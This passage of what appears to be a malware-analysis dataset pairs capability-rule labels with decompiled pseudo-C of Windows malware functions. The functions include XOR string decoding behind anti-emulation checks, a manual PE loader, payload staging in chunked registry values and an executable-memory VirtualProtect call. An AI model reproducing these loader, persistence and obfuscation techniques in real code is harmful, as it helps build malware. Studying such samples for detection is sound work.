(*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        }\n    }\n    return var_c4h;\n}\n",
        "token_count": 3968
    },
    "0040a2f7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a2f7(uchar *arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uchar *in_ECX;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t *piVar11;\n    uchar *in_EDX;\n    int32_t *piVar12;\n    uchar *puVar13;\n    uchar *puVar14;\n    uint32_t uVar15;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = *(in_EDX + 0x3c);\n    uVar2 = *(in_EDX + iVar3 + 0x14);\n    iVar7 = *(in_EDX + iVar3 + 0x3c);\n    uVar6 = *(in_EDX + iVar3 + 6);\n    puVar13 = in_EDX;\n    puVar14 = in_ECX;\n    for (iVar9 = *(in_EDX + iVar3 + 0x54); iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar14 = *puVar13;\n        puVar13 = puVar13 + 1;\n        puVar14 = puVar14 + 1;\n    }\n    if (uVar6 != 0) {\n        piVar12 = in_EDX + uVar2 + 0x2c + iVar3;\n        do {\n            uVar10 = iVar7 + -1 + piVar12[-1] & ~(iVar7 - 1U);\n            if (uVar10 != 0) {\n                puVar13 = in_EDX + *piVar12;\n                puVar14 = in_ECX + piVar12[-2];\n                for (; uVar10 != 0; uVar10 = uVar10 - 1) {\n                    *puVar14 = *puVar13;\n                    puVar13 = puVar13 + 1;\n                    puVar14 = puVar14 + 1;\n                }\n            }\n            piVar12 = piVar12 + 10;\n            uVar6 = uVar6 - 1;\n        } while (uVar6 != 0);\n    }\n    puVar13 = in_ECX;\n    if (arg_8h != NULL) {\n        puVar13 = arg_8h;\n    }\n    iVar7 = 0xa0;\n    if (*(in_EDX + iVar3 + 4) == -0x799c) {\n        iVar7 = 0xb0;\n    }\n    if ((*(in_EDX + iVar7 + iVar3) != 0) && (uVar6 = *(in_EDX + iVar7 + 4 + iVar3),  uVar6 != 0)) {\n        if (*(in_EDX + iVar3 + 4) == -0x799c) {\n            iVar9 = *(in_EDX + iVar3 + 0x30);\n        }\n        else {\n            iVar9 = *(in_EDX + iVar3 + 0x34);\n        }\n        puVar14 = *(in_EDX + iVar3 + 0x30);\n        uVar10 = puVar13 - *(in_EDX + iVar3 + 0x30);\n        iVar4 = *(in_EDX + iVar3 + 0x34);\n        piVar12 = in_ECX + *(in_EDX + iVar7 + iVar3);\n        for (; 8 < uVar6; uVar6 = uVar6 - *piVar11) {\n            iVar3 = *piVar12;\n            uVar15 = piVar12[1] - 8U >> 1;\n            if ((piVar12[1] <= uVar6) && (uVar15 != 0)) {\n                piVar11 = piVar12 + 2;\n                do {\n                    uVar2 = *piVar11;\n                    if (uVar2 >> 0xc == 3) {\n                        *(in_ECX + (uVar2 & 0xfff) + iVar3) = puVar13 + (*(in_ECX + (uVar2 & 0xfff) + iVar3) - iVar9);\n                    }\n                    else if (uVar2 >> 0xc == 10) {\n                        uVar8 = uVar2 & 0xfff;\n                        puVar1 = in_ECX + uVar8 + iVar3;\n                        uVar5 = *puVar1;\n                        *puVar1 = *puVar1 + uVar10;\n                        *(in_ECX + uVar8 + 4 + iVar3) =\n                             *(in_ECX + uVar8 + 4 + iVar3) + (((puVar13 >> 0x1f) - iVar4) - (puVar13 < puVar14)) +\n                             CARRY4(uVar5, uVar10);\n                    }\n                    piVar11 = piVar11 + 2;\n                    uVar15 = uVar15 - 1;\n                } while (uVar15 != 0);\n            }\n            piVar11 = piVar12 + 1;\n            piVar12 = piVar12 + piVar12[1];\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1192
    },
    "0040a630": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.0040a630(int32_t *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint ARG_0;\n    uint lpValueName;\n    uint32_t var_58h;\n    int32_t var_54h;\n    int32_t *var_50h;\n    uint32_t var_4ch;\n    int32_t hKey;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h = var_24h & 0xffffff00;\n    var_50h = param_1;\n    var_20h = param_2;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x208);\n    uVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    if ((((uVar2 != 0) && (param_1 != NULL)) && (*param_1 != 0)) && (param_1[1] != 0)) {\n        var_58h = uVar2;\n        fcn.0040a4ab();\n        hKey = fcn.0040a452(0x20006);\n        if (hKey != 0) {\n            var_44h = *param_1;\n            var_40h = 0x4f3d5a30;\n            var_3ch = 0x5a334425;\n            var_38h = 0x44324f26;\n            var_34h = 0x4f395a1b;\n            var_30h = 0x5a35442a;\n            var_2ch = 0x446e4f31;\n            var_4ch = (((var_44h + 0x7cfffU) / 0x7d000) * 0x7d000) / 0x7d000;\n            puVar7 = &ARG_0;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_28h = 0x4f545a36;\n            puVar7 = &lpValueName;\n            for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                *puVar7 = 0;\n                puVar7 = puVar7 + 1;\n            }\n            var_8h = 0x4f545a52;\n            var_4h._0_2_ = 0x444b;\n            uVar1 = (*pcVar5)(8, 0x39);\n            iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar6 = 0;\n            var_54h = iVar4;\n            do {\n                iVar3 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n                if (iVar3 != 0x1b5326) {\n                    var_ch = 6;\n                    *(iVar6 + iVar4) = *(&var_8h + iVar6 % 6) ^ (iVar6 + iVar4)[&var_40h - iVar4];\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < 0x1c);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar4, var_20h);\n            var_1ch = 0;\n            var_18h = 0x50474a48;\n            var_14h = 0x346f6d2d;\n            var_10h = 0x4a6d7234;\n            var_8h = 0x50344a6d;\n            var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x72);\n            var_20h = 5;\n            pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            do {\n                uVar1 = (*pcVar5)(8, 0x19);\n                iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                iVar6 = 0;\n                var_ch = &var_18h - iVar4;\n                do {\n                    iVar3 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n                    if (iVar3 != 0x9e97e) {\n                        *(iVar6 + iVar4) = *(&var_8h + iVar6 % var_20h) ^ (iVar6 + iVar4)[&var_18h - iVar4];\n                    }\n                    iVar6 = iVar6 + 1;\n                } while (iVar6 < 0xc);\n                puVar7 = &lpValueName;\n                for (iVar6 = 0x40; iVar3 = var_1ch,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar4, &ARG_0, var_1ch);\n                (*_sym.imp.ADVAPI32.dll_RegDeleteValueW)(hKey, &lpValueName);\n                pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                var_1ch = iVar3 + 1;\n            } while (var_1ch < 0x32);\n            var_ch = 0;\n            if (0 < var_4ch) {\n                var_1ch = 0;\n                var_18h = 0x50474a48;\n                var_14h = 0x346f6d2d;\n                var_10h = 0x4a6d7234;\n                var_8h = 0x50344a6d;\n                var_4h._0_2_ = CONCAT11(var_4h._1_1_, 0x72);\n                do {\n                    uVar1 = (*pcVar5)(8, 0x19);\n                    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                    iVar6 = 0;\n                    var_24h = &var_18h - iVar4;\n                    do {\n                        iVar3 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n                        if (iVar3 != 0x9e97e) {\n                            *(iVar6 + iVar4) = *(&var_8h + iVar6 % var_20h) ^ (iVar6 + iVar4)[&var_18h - iVar4];\n                        }\n                        iVar6 = iVar6 + 1;\n                    } while (iVar6 < 0xc);\n                    puVar7 = &lpValueName;\n                    for (iVar6 = 0x40; iVar3 = var_ch,  iVar6 != 0; iVar6 = iVar6 + -1) {\n                        *puVar7 = 0;\n                        puVar7 = puVar7 + 1;\n                    }\n                    (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar4, &ARG_0, var_ch);\n                    iVar6 = 0x7d000;\n                    if (var_44h < 0x7d000) {\n                        iVar6 = var_44h;\n                    }\n                    iVar6 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)\n                                      (hKey, &lpValueName, 0, 3, var_50h[1] + var_1ch, iVar6);\n                    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    var_24h = -iVar6 & 0xffffff00U | 1 - (iVar6 != 0);\n                    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                    var_ch = iVar3 + 1;\n                    var_1ch = var_1ch + 0x7d000;\n                    var_44h = var_44h + -0x7d000;\n                } while (var_ch < var_4ch);\n            }\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n            uVar1 = (*pcVar5)(0, var_54h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar2 = var_58h;\n        }\n        uVar1 = (*pcVar5)(0, uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    return uVar2 & 0xffffff00 | var_24h & 0xff;\n}\n",
        "token_count": 2156
    },
    "0040a969": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0040a969(int32_t *param_1, int32_t param_2)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uchar *puVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uchar *puVar10;\n    code *pcVar11;\n    uint ARG_0;\n    uint lpValueName;\n    uint var_70h;\n    int32_t var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    uchar *var_5ch;\n    uchar *var_58h;\n    int32_t *var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uchar *var_48h;\n    uchar *var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *lpcbData;\n    int32_t lpType;\n    uint var_10h;\n    uint var_ch;\n    int32_t hKey;\n    uint var_1h;\n    \n    pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    *param_1 = 0;\n    param_1[1] = 0;\n    var_54h = param_1;\n    lpType = param_2;\n    uVar2 = (*pcVar11)(8, 0x208);\n    iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n    if (iVar3 != 0) {\n        var_50h = iVar3;\n        fcn.0040a4ab();\n        var_64h = fcn.0040a452(0x20019);\n        if (var_64h != 0) {\n            var_4ch = 0;\n            var_40h = 0x4f3d5a30;\n            puVar9 = &ARG_0;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            var_3ch = 0x5a334425;\n            puVar9 = &lpValueName;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar9 = 0;\n                puVar9 = puVar9 + 1;\n            }\n            var_38h = 0x44324f26;\n            var_34h = 0x4f395a1b;\n            var_30h = 0x5a35442a;\n            var_2ch = 0x446e4f31;\n            var_28h = 0x4f545a36;\n            var_10h = 0x4f545a52;\n            var_ch._0_2_ = 0x444b;\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x39);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n            iVar8 = 0;\n            var_68h = iVar3;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n                if (iVar4 != 0x1b5326) {\n                    hKey = 6;\n                    *(iVar8 + iVar3) = *(&var_10h + iVar8 % 6) ^ (iVar8 + iVar3)[&var_40h - iVar3];\n                }\n                iVar8 = iVar8 + 1;\n            } while (iVar8 < 0x1c);\n            (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, iVar3, lpType);\n            var_24h = 0x50474a48;\n            var_20h = 0x346f6d2d;\n            var_1ch = 0x4a6d7234;\n            var_10h = 0x50344a6d;\n            var_ch._0_2_ = CONCAT11(var_ch._1_1_, 0x72);\n            do {\n                pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                puVar9 = &var_70h;\n                for (iVar3 = 8; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                puVar9 = &lpValueName;\n                for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar9 = 0;\n                    puVar9 = puVar9 + 1;\n                }\n                uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n                iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                iVar8 = 0;\n                lpType = &var_24h - iVar3;\n                var_6ch = iVar3;\n                do {\n                    iVar5 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n                    iVar4 = var_4ch;\n                    if (iVar5 != 0x9e97e) {\n                        hKey = 5;\n                        *(iVar8 + iVar3) = *(&var_10h + iVar8 % 5) ^ (iVar8 + iVar3)[lpType];\n                    }\n                    iVar8 = iVar8 + 1;\n                } while (iVar8 < 0xc);\n                (*_sym.imp.USER32.dll_wsprintfW)(&lpValueName, iVar3, &ARG_0, var_4ch);\n                var_1h._0_1_ = '\\0';\n                var_44h = NULL;\n                var_4ch = iVar4 + 1;\n                var_48h = NULL;\n                hKey = fcn.0040a452(0x20019);\n                param_1 = var_54h;\n                if (hKey != 0) {\n                    lpType = 3;\n                    lpcbData = NULL;\n                    var_5ch = NULL;\n                    iVar8 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(hKey, &lpValueName, 0, &lpType, 0, &lpcbData);\n                    if (iVar8 == 0) {\n                        uVar2 = (*pcVar11)(8, lpcbData);\n                        var_58h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        puVar7 = var_5ch;\n                        puVar6 = var_5ch;\n                        if ((var_58h == NULL) ||\n                           (iVar8 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)\n                                              (hKey, &lpValueName, 0, &lpType, var_58h, &lpcbData),  puVar7 = var_58h, \n                           puVar6 = lpcbData,  iVar8 == 0)) {\n                            var_1h._0_1_ = '\\x01';\n                            var_48h = puVar6;\n                            var_44h = puVar7;\n                        }\n                    }\n                    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n                    if (((var_1h != '\\0') && (var_44h != NULL)) && (var_48h != NULL)) {\n                        if (param_1[1] == 0) {\n                            uVar2 = (*pcVar11)(8, var_48h);\n                            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n                        }\n                        else {\n                            uVar2 = (*pcVar11)(0, param_1[1], var_48h + *param_1);\n                            iVar3 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(uVar2);\n                        }\n                        param_1[1] = iVar3;\n                        puVar6 = var_44h;\n                        puVar10 = iVar3 + *param_1;\n                        for (puVar7 = var_48h; puVar7 != NULL; puVar7 = puVar7 + -1) {\n                            *puVar10 = *puVar6;\n                            puVar6 = puVar6 + 1;\n                            puVar10 = puVar10 + 1;\n                        }\n                        *param_1 = var_48h + *param_1;\n                        pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_44h);\n                        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n                        iVar3 = var_6ch;\n                    }\n                }\n                uVar2 = (*pcVar11)(0, iVar3);\n                pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n            } while (var_1h != '\\0');\n            (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_64h);\n            uVar2 = (*pcVar11)(0, var_68h);\n            (*pcVar1)(uVar2);\n            iVar3 = var_50h;\n        }\n        uVar2 = (*pcVar11)(0, iVar3);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    }\n    uVar2 = 1;\n    if ((*param_1 == 0) || (param_1[1] == 0)) {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 2256
    },
    "0040aeb9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040aeb9(char *param_1, char *param_2)\n\n{\n    uint uVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char cVar4;\n    char *pcVar5;\n    uint uVar6;\n    uint var_4h;\n    \n    uVar6 = 0;\n    if (param_1 != NULL) {\n        if (param_2 == 0xffffffff) {\n            param_2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(param_1);\n        }\n        pcVar2 = param_2;\n        if (1 < param_2) {\n            do {\n                pcVar2 = pcVar2 + -1;\n                if (pcVar2 < 0) goto code_r0x0040aefb;\n                pcVar3 = param_1 + pcVar2;\n            } while (*pcVar3 != '\\\\');\n            if (pcVar3 != NULL) {\n                param_2 = param_1 + (param_2 - (pcVar3 + 1));\n                param_1 = pcVar3 + 1;\n            }\n        }\ncode_r0x0040aefb:\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, param_2 + 1);\n        pcVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        if (pcVar2 != NULL) {\n            pcVar3 = pcVar2;\n            pcVar5 = param_2;\n            if ((*param_1 == '\\\"') && (param_1[param_2 + -1] == '\\\"')) {\n                param_2 = param_2 + -2;\n                param_1 = param_1 + 1;\n                pcVar5 = param_2;\n            }\n            for (; param_2 != NULL; param_2 = param_2 + -1) {\n                *pcVar3 = *param_1;\n                param_1 = param_1 + 1;\n                pcVar3 = pcVar3 + 1;\n            }\n            pcVar2[pcVar5] = '\\0';\n            cVar4 = *pcVar2;\n            pcVar3 = pcVar2;\n            while (cVar4 != '\\0') {\n                cVar4 = *pcVar3;\n                if (cVar4 + 0x9fU < 0x1a) {\n                    cVar4 = cVar4 + -0x20;\n                }\n                *pcVar3 = cVar4;\n                pcVar3 = pcVar3 + 1;\n                cVar4 = *pcVar3;\n            }\n            uVar6 = fcn.00404313();\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar2);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        }\n    }\n    return uVar6;\n}\n",
        "token_count": 641
    },
    "0040b50c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.0040b50c(uint32_t arg_8h, uint arg_ch, int16_t **arg_10h, int32_t *arg_14h)\n\n{\n    int16_t iVar1;\n    uint16_t uVar2;\n    code *pcVar3;\n    uint uVar4;\n    int16_t *piVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t iVar8;\n    int16_t *piVar9;\n    uint32_t in_EDX;\n    uint32_t uVar10;\n    code *pcVar11;\n    int32_t iVar12;\n    uint32_t uVar13;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int16_t *var_38h;\n    uint32_t var_34h;\n    uint32_t var_30h;\n    uint var_2ch;\n    uint16_t *var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    uint32_t var_14h;\n    int32_t lpFindFileData;\n    int32_t lpBuffer;\n    int16_t *lpMem;\n    int32_t var_4h;\n    \n    pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar13 = 0;\n    var_24h = 0;\n    var_34h = 0;\n    var_4h = 0;\n    var_1ch = in_EDX;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x250);\n    pcVar3 = _sym.imp.KERNEL32.dll_HeapAlloc;\n    lpFindFileData = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    if (lpFindFileData == 0) {\n        return 0;\n    }\n    uVar4 = (*pcVar11)(8, 0x208);\n    lpBuffer = (*pcVar3)(uVar4);\n    if (lpBuffer == 0) goto code_r0x0040b7cb;\n    uVar4 = (*pcVar11)(8, 0x208);\n    lpMem = (*pcVar3)(uVar4);\n    if (lpMem != NULL) {\n        var_48h = 0x47653033;\n        var_44h = 0x300a554c;\n        var_40h = 0x55074737;\n        piVar5 = lpMem;\n        for (iVar8 = 0x208; iVar8 != 0; iVar8 = iVar8 + -1) {\n            *piVar5 = 0;\n            piVar5 = piVar5 + 1;\n        }\n        var_3ch._0_2_ = 0x306f;\n        var_30h = 0x474f306f;\n        var_2ch._0_2_ = 0x5562;\n        uVar4 = (*pcVar11)(8, 0x1d);\n        piVar5 = (*pcVar3)(uVar4);\n        iVar8 = 0;\n        var_38h = piVar5;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n            iVar12 = lpBuffer;\n            if (iVar6 != 0x274076) {\n                var_20h = 6;\n                *(iVar8 + piVar5) = *(&var_30h + iVar8 % 6) ^ (iVar8 + piVar5)[&var_48h - piVar5];\n            }\n            pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < 0xe);\n        piVar9 = piVar5;\n        do {\n            iVar1 = *piVar9;\n            piVar9 = piVar9 + 1;\n        } while (iVar1 != 0);\n        iVar8 = (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(lpBuffer, 0x103 - (piVar9 - (piVar5 + 1) >> 1));\n        if (iVar8 == 0) {\ncode_r0x0040b79d:\n            uVar4 = (*pcVar11)(0, lpMem);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n            uVar13 = var_34h;\n        }\n        else {\n            if (var_18h == 0) {\n                var_1ch = fcn.00409d4f();\n                var_1ch = var_1ch & 0xff;\n                arg_8h = fcn.00409d4f();\n                arg_8h = arg_8h & 0xff;\n            }\n            var_14h = arg_8h;\n            (*_sym.imp.KERNEL32.dll_lstrcatW)(iVar12, piVar5);\n            var_18h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar12, lpFindFileData);\n            if (var_18h == -1) goto code_r0x0040b79d;\n            iVar8 = lpFindFileData;\n            iVar12 = lpBuffer;\n            for (uVar13 = 0; (uVar13 <= var_1ch || (uVar13 <= var_14h)); uVar13 = uVar13 + 1) {\n                if ((uVar13 == var_1ch) || (uVar13 == var_14h)) {\n                    iVar6 = (*_sym.imp.SHLWAPI.dll_StrRChrW)(iVar8 + 0x2c, 0, 0x2e);\n                    var_34h = (iVar6 + (-0x2c - iVar8) >> 1) >> 1;\n                    var_20h = 0;\n                    if ((var_4h != 0) && (var_20h = var_34h - 4,  var_34h < var_20h)) {\n                        var_20h = 0;\n                    }\n                    if (4 < var_34h) {\n                        var_34h = 4;\n                    }\n                    piVar5 = lpMem;\n                    do {\n                        iVar1 = *piVar5;\n                        piVar5 = piVar5 + 1;\n                    } while (iVar1 != var_24h);\n                    for (piVar5 = lpMem + (piVar5 - (lpMem + 1) >> 1); *piVar5 != 0; piVar5 = piVar5 + 1) {\n                    }\n                    var_28h = iVar8 + (var_20h + 0x16) * 2;\n                    var_20h = *var_28h;\n                    if (*var_28h != 0) {\n                        iVar6 = var_28h - piVar5;\n                        uVar7 = var_20h;\n                        uVar10 = var_34h;\n                        do {\n                            iVar8 = lpFindFileData;\n                            iVar12 = lpBuffer;\n                            if (uVar10 == 0) break;\n                            *piVar5 = uVar7;\n                            piVar5 = piVar5 + 1;\n                            uVar10 = uVar10 - 1;\n                            uVar2 = *(iVar6 + piVar5);\n                            uVar7 = uVar2;\n                        } while (uVar2 != 0);\n                    }\n                    var_4h = var_4h + var_34h;\n                    *piVar5 = 0;\n                    var_30h = var_34h;\n                }\n                iVar6 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(var_18h, iVar8);\n                if (iVar6 == 0) {\n                    var_18h = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(iVar12, iVar8);\n                }\n            }\n            *arg_10h = lpMem;\n            lpMem[var_4h] = 0;\n            *arg_14h = var_4h;\n            (*_sym.imp.KERNEL32.dll_FindClose)(var_18h);\n            pcVar11 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            piVar5 = var_38h;\n            uVar13 = 1;\n        }\n        uVar4 = (*pcVar11)(0, piVar5);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    }\n    uVar4 = (*pcVar11)(0, lpBuffer);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\ncode_r0x0040b7cb:\n    uVar4 = (*pcVar11)(0, lpFindFileData);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar4);\n    return uVar13;\n}\n",
        "token_count": 1978
    },
    "0040c0f4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040c0f4(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *puVar5;\n    code *pcVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint *puVar9;\n    uint var_34ch;\n    uint var_144h;\n    uint var_104h;\n    uint var_c4h;\n    uint var_b8h;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uchar var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_a8h = 0x208;\n    iVar2 = fcn.0040b7e3();\n    if (iVar2 == 0) {\n        fcn.0040ba16();\n        fcn.00407f43();\n    }\n    while (iVar2 = fcn.00408c8e(),  pcVar6 = _sym.imp.KERNEL32.dll_VirtualProtect,  iVar2 != 0) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_VirtualProtect)(0x4122f0, 0x184, 0x40, &var_98h);\n    if (iVar2 != 0) {\n        fcn.00408e3d();\n        (*pcVar6)(0x4122f0, 